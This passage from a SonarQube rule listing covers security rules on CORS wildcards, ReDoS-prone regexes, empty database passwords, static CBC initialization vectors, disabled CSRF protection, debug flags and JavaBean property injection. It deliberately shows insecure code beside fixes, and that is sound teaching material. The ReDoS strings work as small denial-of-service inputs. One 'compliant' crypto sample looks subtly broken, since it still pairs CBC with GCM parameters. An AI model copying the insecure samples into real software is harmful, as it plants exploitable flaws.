  &lt;filter-class&gt;org.apache.catalina.filters.CorsFilter&lt;/filter-class&gt;
  &lt;init-param&gt;
    &lt;param-name&gt;cors.allowed.origins&lt;/param-name&gt;
    &lt;param-value&gt;*&lt;/param-value&gt; &lt;!-- Sensitive --&gt;
  &lt;/init-param&gt;
&lt;/filter&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;!-- Tomcat 7&#43; Cors Filter --&gt;
&lt;filter&gt;
  &lt;filter-name&gt;CorsFilter&lt;/filter-name&gt;
  &lt;filter-class&gt;org.apache.catalina.filters.CorsFilter&lt;/filter-class&gt;
  &lt;init-param&gt;
    &lt;param-name&gt;cors.allowed.origins&lt;/param-name&gt;
    &lt;param-value&gt;https://trusted1.org,https://trusted2.org&lt;/param-value&gt; &lt;!-- Compliant --&gt;
  &lt;/init-param&gt;
&lt;/filter&gt;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" rel="nofollow">developer.mozilla.org</a> - CORS </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" rel="nofollow">developer.mozilla.org</a> - Same origin policy </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing" rel="nofollow">OWASP HTML5 Security
  Cheat Sheet</a> - Cross Origin Resource Sharing </li><li> <a href="https://cwe.mitre.org/data/definitions/346" rel="nofollow">MITRE, CWE-346</a> - Origin Validation Error </li><li> <a href="https://cwe.mitre.org/data/definitions/942" rel="nofollow">MITRE, CWE-942</a> - Overly Permissive Cross-domain Whitelist </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S3281">
              xml:S3281
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Default interceptors, such as application security interceptors, must be listed in the <code>ejb-jar.xml</code> file, or they will not be treated
as default.</p>
<p>This rule applies to projects that contain JEE Beans (any one of <code>javax.ejb.Singleton</code>, <code>MessageDriven</code>,
<code>Stateless</code> or <code>Stateful</code>).</p>
<h3>Noncompliant code example</h3>
<pre>
// file: ejb-interceptors.xml
&lt;assembly-descriptor&gt;
 &lt;interceptor-binding&gt; &lt;!-- should be declared in ejb-jar.xml --&gt;
      &lt;ejb-name&gt;*&lt;/ejb-name&gt;
      &lt;interceptor-class&gt;com.myco.ImportantInterceptor&lt;/interceptor-class&gt; &lt;!-- Noncompliant; will NOT be treated as default --&gt;
   &lt;/interceptor-binding&gt;
&lt;/assembly-descriptor&gt;
</pre>
<h3>Compliant solution</h3>
<pre>
// file: ejb-jar.xml
&lt;assembly-descriptor&gt;
 &lt;interceptor-binding&gt;
      &lt;ejb-name&gt;*&lt;/ejb-name&gt;
      &lt;interceptor-class&gt;com.myco.ImportantInterceptor&lt;/interceptor-class&gt;
   &lt;/interceptor-binding&gt;
&lt;/assembly-descriptor&gt;
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5852">
              java:S5852
            </a>
          </td>
          <td>
            <details>
              <p>Most of the regular expression engines use <code>backtracking</code> to try all possible execution paths of the regular expression when evaluating
an input, in some cases it can cause performance issues, called <code>catastrophic backtracking</code> situations. In the worst case, the complexity
of the regular expression is exponential in the size of the input, this means that a small carefully-crafted input (like 20 chars) can trigger
<code>catastrophic backtracking</code> and cause a denial of service of the application. Super-linear regex complexity can lead to the same impact too
with, in this case, a large carefully-crafted input (thousands chars).</p>
<p>This rule determines the runtime complexity of a regular expression and informs you of the complexity if it is not linear.</p>
<p>Note that, due to improvements to the matching algorithm, some cases of exponential runtime complexity have become impossible when run using JDK 9
or later. In such cases, an issue will only be reported if the project’s target Java version is 8 or earlier.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The input is user-controlled. </li><li> The input size is not restricted to a small number of characters. </li><li> There is no timeout in place to limit the regex evaluation time. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>To avoid <code>catastrophic backtracking</code> situations, make sure that none of the following conditions apply to your regular expression.</p>
<p>In all of the following cases, catastrophic backtracking can only happen if the problematic part of the regex is followed by a pattern that can
fail, causing the backtracking to actually happen. Note that when performing a full match (e.g. using <code>String.matches</code>), the end of the
regex counts as a pattern that can fail because it will only succeed when the end of the string is reached.</p>
<ul><li> If you have a non-possessive repetition <code>r*</code> or <code>r*?</code>, such that the regex <code>r</code> could produce different
  possible matches (of possibly different lengths) on the same input, the worst case matching time can be exponential. This can be the case if
  <code>r</code> contains optional parts, alternations or additional repetitions (but not if the repetition is written in such a way that there’s only
  one way to match it).
    <ul><li> When using JDK 9 or later an optimization applies when the repetition is greedy and the entire regex does not contain any back references.
      In that case the runtime will only be polynomial (in case of nested repetitions) or even linear (in case of alternations or optional parts).
      </li></ul>  </li><li> If you have multiple non-possessive repetitions that can match the same contents and are consecutive or are only separated by an optional
  separator or a separator that can be matched by both of the repetitions, the worst case matching time can be polynomial (O(n^c) where c is the
  number of problematic repetitions). For example <code>a*b*</code> is not a problem because <code>a*</code> and <code>b*</code> match different
  things and <code>a*_a*</code> is not a problem because the repetitions are separated by a <code>&#39;_&#39;</code> and can’t match that <code>&#39;_&#39;</code>.
  However, <code>a*a*</code> and <code>.*_.*</code> have quadratic runtime. </li><li> If you’re performing a partial match (such as by using <code>Matcher.find</code>, <code>String.split</code>, <code>String.replaceAll</code>
  etc.) and the regex is not anchored to the beginning of the string, quadratic runtime is especially hard to avoid because whenever a match fails,
  the regex engine will try again starting at the next index. This means that any unbounded repetition (even a possessive one), if it’s followed by a
  pattern that can fail, can cause quadratic runtime on some inputs. For example <code>str.split(&#34;\\s*,&#34;)</code> will run in quadratic time on strings
  that consist entirely of spaces (or at least contain large sequences of spaces, not followed by a comma). </li></ul>
<p>In order to rewrite your regular expression without these patterns, consider the following strategies:</p>
<ul><li> If applicable, define a maximum number of expected repetitions using the bounded quantifiers, like <code>{1,5}</code> instead of <code>&#43;</code>
  for instance. </li><li> Refactor <code>nested quantifiers</code> to limit the number of way the inner group can be matched by the outer quantifier, for instance this
  nested quantifier situation <code>(ba&#43;)&#43;</code> doesn’t cause performance issues, indeed, the inner group can be matched only if there exists
  exactly one <code>b</code> char per repetition of the group. </li><li> Optimize regular expressions with <code>possessive quantifiers</code> and <code>atomic grouping</code>. </li><li> Use negated character classes instead of <code>.</code> to exclude separators where applicable. For example the quadratic regex
  <code>.*_.*</code> can be made linear by changing it to <code>[^_]*_.*</code> </li></ul>
<p>Sometimes it’s not possible to rewrite the regex to be linear while still matching what you want it to match. Especially when using partial
matches, for which it is quite hard to avoid quadratic runtimes. In those cases consider the following approaches:</p>
<ul><li> Solve the problem without regular expressions </li><li> Use an alternative non-backtracking regex implementations such as Google’s <a href="https://github.com/google/re2" rel="nofollow">RE2</a> or <a href="https://github.com/google/re2j" rel="nofollow">RE2/J</a>. </li><li> Use multiple passes. This could mean pre- and/or post-processing the string manually before/after applying the regular expression to it or
  using multiple regular expressions. One example of this would be to replace <code>str.split(&#34;\\s*,\\s*&#34;)</code> with <code>str.split(&#34;,&#34;)</code> and
  then trimming the spaces from the strings as a second step. </li><li> When using <code>Matcher.find()</code>, it is often possible to make the regex infallible by making all the parts that could fail optional,
  which will prevent backtracking. Of course this means that you’ll accept more strings than intended, but this can be handled by using capturing
  groups to check whether the optional parts were matched or not and then ignoring the match if they weren’t. For example the regex <code>x*y</code>
  could be replaced with <code>x*(y)?</code> and then the call to <code>matcher.find()</code> could be replaced with <code>matcher.find() &amp;&amp;
  matcher.group(1) !&#61; null</code>. </li></ul>
<h2>Sensitive Code Example</h2>
<p>The first regex evaluation will never end in <code>JDK</code> &lt;&#61; 9 and the second regex evaluation will never end in any versions of the
<code>JDK</code>:</p>
<pre>
java.util.regex.Pattern.compile(&#34;(a&#43;)&#43;&#34;).matcher(
&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;&#43;
&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;&#43;
&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;&#43;
&#34;aaaaaaaaaaaaaaa!&#34;).matches(); // Sensitive

java.util.regex.Pattern.compile(&#34;(h|h|ih(((i|a|c|c|a|i|i|j|b|a|i|b|a|a|j))&#43;h)ahbfhba|c|i)*&#34;).matcher(
&#34;hchcchicihcchciiicichhcichcihcchiihichiciiiihhcchi&#34;&#43;
&#34;cchhcihchcihiihciichhccciccichcichiihcchcihhicchcciicchcccihiiihhihihihi&#34;&#43;
&#34;chicihhcciccchihhhcchichchciihiicihciihcccciciccicciiiiiiiiicihhhiiiihchccch&#34;&#43;
&#34;chhhhiiihchihcccchhhiiiiiiiicicichicihcciciihichhhhchihciiihhiccccccciciihh&#34;&#43;
&#34;ichiccchhicchicihihccichicciihcichccihhiciccccccccichhhhihihhcchchihih&#34;&#43;
&#34;iihhihihihicichihiiiihhhhihhhchhichiicihhiiiiihchccccchichci&#34;).matches(); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Possessive quantifiers do not keep backtracking positions, thus can be used, if possible, to avoid performance issues:</p>
<pre>
java.util.regex.Pattern.compile(&#34;(a&#43;)&#43;&#43;&#34;).matcher(
&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;&#43;
&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;&#43;
&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;&#43;
&#34;aaaaaaaaaaaaaaa!&#34;).matches(); // Compliant

java.util.regex.Pattern.compile(&#34;(h|h|ih(((i|a|c|c|a|i|i|j|b|a|i|b|a|a|j))&#43;h)ahbfhba|c|i)*&#43;&#34;).matcher(
&#34;hchcchicihcchciiicichhcichcihcchiihichiciiiihhcchi&#34;&#43;
&#34;cchhcihchcihiihciichhccciccichcichiihcchcihhicchcciicchcccihiiihhihihihi&#34;&#43;
&#34;chicihhcciccchihhhcchichchciihiicihciihcccciciccicciiiiiiiiicihhhiiiihchccch&#34;&#43;
&#34;chhhhiiihchihcccchhhiiiiiiiicicichicihcciciihichhhhchihciiihhiccccccciciihh&#34;&#43;
&#34;ichiccchhicchicihihccichicciihcichccihhiciccccccccichhhhihihhcchchihih&#34;&#43;
&#34;iihhihihihicichihiiiihhhhihhhchhichiicihhiiiiihchccccchichci&#34;).matches(); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li><li> <a href="https://cwe.mitre.org/data/definitions/1333" rel="nofollow">MITRE, CWE-1333</a> - Inefficient Regular Expression Complexity </li><li> <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">owasp.org</a> - OWASP Regular expression Denial
  of Service - ReDoS </li><li> <a href="https://web.archive.org/web/20220506215733/https://stackstatus.net/post/147710624694/outage-postmortem-july-20-2016" rel="nofollow">stackstatus.net(archived)</a> - Outage Postmortem - July 20, 2016 </li><li> <a href="https://www.regular-expressions.info/catastrophic.html" rel="nofollow">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic
  Backtracking </li><li> <a href="https://docs.microsoft.com/en-us/dotnet/standard/base-types/backtracking-in-regular-expressions#backtracking-with-nested-optional-quantifiers" rel="nofollow">docs.microsoft.com</a> - Backtracking with Nested Optional Quantifiers </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2115">
              java:S2115
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>When relying on the password authentication mode for the database connection, a secure password should be chosen.</p>
<p>This rule raises an issue when an empty password is used.</p>
<h3>Noncompliant code example</h3>
<pre>
Connection conn &#61; DriverManager.getConnection(&#34;jdbc:derby:memory:myDB;create&#61;true&#34;, &#34;login&#34;, &#34;&#34;);
</pre>
<h3>Compliant solution</h3>
<pre>
String password &#61; System.getProperty(&#34;database.password&#34;);
Connection conn &#61; DriverManager.getConnection(&#34;jdbc:derby:memory:myDB;create&#61;true&#34;, &#34;login&#34;, password);
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication.html" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken
  Authentication </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/521" rel="nofollow">MITRE, CWE-521</a> - Weak Password Requirements </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S3329">
              java:S3329
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>In the mode Cipher Block Chaining (CBC), each block is used as cryptographic input for the next block. For this reason, the first block requires an
initialization vector (IV), also called a &#34;starting variable&#34; (SV).</p>
<p>If the same IV is used for multiple encryption sessions or messages, each new encryption of the same plaintext input would always produce the same
ciphertext output. This may allow an attacker to detect patterns in the ciphertext.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, a company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Java Cryptographic Extension</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import java.nio.charset.StandardCharsets;
import java.security.NoSuchAlgorithmException;
import java.security.InvalidKeyException;
import java.security.InvalidAlgorithmParameterException;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.NoSuchPaddingException;

public void encrypt(String key, String plainText) {

    byte[] RandomBytes &#61; &#34;7cVgr5cbdCZVw5WY&#34;.getBytes(StandardCharsets.UTF_8);

    GCMParameterSpec iv   &#61; new GCMParameterSpec(128, RandomBytes);
    SecretKeySpec keySpec &#61; new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), &#34;AES&#34;);

    try {
        Cipher cipher &#61; Cipher.getInstance(&#34;AES/CBC/NoPadding&#34;);
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv); // Noncompliant

    } catch(NoSuchAlgorithmException|InvalidKeyException|
            NoSuchPaddingException|InvalidAlgorithmParameterException e) {
        // ...
    }
}
</pre>
<h4>Compliant solution</h4>
<p>In this example, the code explicitly uses a number generator that is considered <strong>strong</strong>.</p>
<pre data-diff-id="1" data-diff-type="compliant">
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.security.NoSuchAlgorithmException;
import java.security.InvalidKeyException;
import java.security.InvalidAlgorithmParameterException;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.NoSuchPaddingException;

public void encrypt(String key, String plainText) {

    SecureRandom random &#61; new SecureRandom();
    byte[] randomBytes  &#61; new byte[16];
    random.nextBytes(randomBytes);

    GCMParameterSpec iv   &#61; new GCMParameterSpec(128, randomBytes);
    SecretKeySpec keySpec &#61; new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), &#34;AES&#34;);

    try {
        Cipher cipher &#61; Cipher.getInstance(&#34;AES/CBC/NoPadding&#34;);
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv); // Noncompliant

    } catch(NoSuchAlgorithmException|InvalidKeyException|
            NoSuchPaddingException|InvalidAlgorithmParameterException e) {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Use unique IVs</h4>
<p>To ensure strong security, the initialization vectors for each encryption operation must be unique and random but they do not have to be
secret.</p>
<p>In the previous non-compliant example, the problem is not that the IV is hard-coded.<br /> It is that the same IV is used for multiple encryption
attempts.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/329" rel="nofollow">MITRE, CWE-329</a> - Not Using an Unpredictable IV with CBC Mode </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf" rel="nofollow">NIST, SP-800-38A</a> - Recommendation for Block Cipher
  Modes of Operation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4502">
              java:S4502
            </a>
          </td>
          <td>
            <details>
              <p>A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be forced, by an attacker, to perform sensitive
actions that he didn’t intend, such as updating his profile or sending a message, more generally anything that can change the state of the
application.</p>
<p>The attacker can trick the user/victim to click on a link, corresponding to the privileged action, or to visit a malicious web site that embeds a
hidden web request and as web browsers automatically include cookies, the actions can be authenticated and sensitive.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The web application uses cookies to authenticate users. </li><li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li><li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Protection against CSRF attacks is strongly recommended:
    <ul><li> to be activated by default for all <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods" rel="nofollow">unsafe HTTP
      methods</a>. </li><li> implemented, for example, with an unguessable CSRF token </li></ul>  </li><li> Of course all sensitive operations should not be performed with <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods" rel="nofollow">safe HTTP</a> methods like <code>GET</code> which are designed to be
  used only for information retrieval. </li></ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://docs.spring.io/spring-security/site/docs/5.0.x/reference/html/csrf.html#csrf-using" rel="nofollow">Spring Security</a> provides by default a
protection against CSRF attacks which can be disabled:</p>
<pre>
&#64;EnableWebSecurity
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {

  &#64;Override
  protected void configure(HttpSecurity http) throws Exception {
    http.csrf().disable(); // Sensitive: csrf protection is entirely disabled
   // or
    http.csrf().ignoringAntMatchers(&#34;/route/&#34;); // Sensitive: csrf protection is disabled for specific routes
  }
}
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://docs.spring.io/spring-security/site/docs/5.0.x/reference/html/csrf.html#csrf-using" rel="nofollow">Spring Security</a> CSRF protection is enabled
by default, do not disable it:</p>
<pre>
&#64;EnableWebSecurity
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {

  &#64;Override
  protected void configure(HttpSecurity http) throws Exception {
    // http.csrf().disable(); // Compliant
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/352" rel="nofollow">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-community/attacks/csrf" rel="nofollow">OWASP: Cross-Site Request Forgery</a> </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4507">
              java:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li><li> The application runs by default with debug features activated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers or applications distributed to end users.</p>
<h2>Sensitive Code Example</h2>
<p><code>Throwable.printStackTrace(...)</code> prints a Throwable and its stack trace to <code>System.Err</code> (by default) which is not easily
parseable and can expose sensitive information:</p>
<pre>
try {
  /* ... */
} catch(Exception e) {
  e.printStackTrace(); // Sensitive
}
</pre>
<p><a href="https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/config/annotation/web/configuration/EnableWebSecurity.html" rel="nofollow">EnableWebSecurity</a>
annotation for SpringFramework with <code>debug</code> to <code>true</code> enables debugging support:</p>
<pre>
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;

&#64;Configuration
&#64;EnableWebSecurity(debug &#61; true) // Sensitive
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
  // ...
}
</pre>
<p><a href="https://developer.android.com/reference/android/webkit/WebView#setWebContentsDebuggingEnabled%28boolean%29" rel="nofollow">WebView.setWebContentsDebuggingEnabled(true)</a>
for Android enables debugging support:</p>
<pre>
import android.webkit.WebView;

WebView.setWebContentsDebuggingEnabled(true); // Sensitive
WebView.getFactory().getStatics().setWebContentsDebuggingEnabled(true); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Loggers should be used (instead of <code>printStackTrace</code>) to print throwables:</p>
<pre>
try {
  /* ... */
} catch(Exception e) {
  LOGGER.log(&#34;context&#34;, e);
}
</pre>
<p><a href="https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/config/annotation/web/configuration/EnableWebSecurity.html" rel="nofollow">EnableWebSecurity</a>
annotation for SpringFramework with <code>debug</code> to <code>false</code> disables debugging support:</p>
<pre>
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;

&#64;Configuration
&#64;EnableWebSecurity(debug &#61; false)
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
  // ...
}
</pre>
<p><a href="https://developer.android.com/reference/android/webkit/WebView#setWebContentsDebuggingEnabled%28boolean%29" rel="nofollow">WebView.setWebContentsDebuggingEnabled(false)</a>
for Android disables debugging support:</p>
<pre>
import android.webkit.WebView;

WebView.setWebContentsDebuggingEnabled(false);
WebView.getFactory().getStatics().setWebContentsDebuggingEnabled(false);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/489" rel="nofollow">MITRE, CWE-489</a> - Active Debug Code </li><li> <a href="https://cwe.mitre.org/data/definitions/215" rel="nofollow">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4512">
              java:S4512
            </a>
          </td>
          <td>
            <details>
              <p>Setting JavaBean properties is security sensitive. Doing it with untrusted values has led in the past to the following vulnerability:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2014-0114" rel="nofollow">CVE-2014-0114</a> </li></ul>
<p>JavaBeans can have their properties or nested properties set by population functions. An attacker can leverage this feature to push into the
JavaBean malicious data that can compromise the software integrity. A typical attack will try to manipulate the ClassLoader and finally execute
malicious code.</p>
<p>This rule raises an issue when:</p>
<ul><li> BeanUtils.populate(…​) or BeanUtilsBean.populate(…​) from <a href="http://commons.apache.org/proper/commons-beanutils/" rel="nofollow">Apache Commons
  BeanUtils</a> are called </li><li> BeanUtils.setProperty(…​) or BeanUtilsBean.setProperty(…​) from <a href="http://commons.apache.org/proper/commons-beanutils/" rel="nofollow">Apache Commons
  BeanUtils</a> are called </li><li> org.springframework.beans.BeanWrapper.setPropertyValue(…​) or org.springframework.beans.BeanWrapper.setPropertyValues(…​) from Spring is called
  </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> the new property values might have been tampered with or provided by an untrusted source. </li><li> sensitive properties can be modified, for example: <code>class.classLoader</code> </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Sanitize all values used as JavaBean properties.</p>
<p>Don’t set any sensitive properties. Keep full control over which properties are set. If the property names are provided by an unstrusted source,
filter them with a whitelist.</p>
<h2>Sensitive Code Example</h2>
<pre>
Company bean &#61; new Company();
HashMap map &#61; new HashMap();
Enumeration names &#61; request.getParameterNames();
while (names.hasMoreElements()) {
    String name &#61; (String) names.nextElement();
    map.put(name, request.getParameterValues(name));
}
BeanUtils.populate(bean, map); // Sensitive: &#34;map&#34; is populated with data coming from user input, here &#34;request.getParameterNames()&#34;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/915" rel="nofollow">MITRE, CWE-915</a> - Improperly Controlled Modification of Dynamically-Determined Object
  Attributes </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ" rel="nofollow">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li><li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#BEAN_PROPERTY_INJECTION" rel="nofollow">BEAN_PROPERTY_INJECTION</a> </li></ul>
            </details>
          </td>
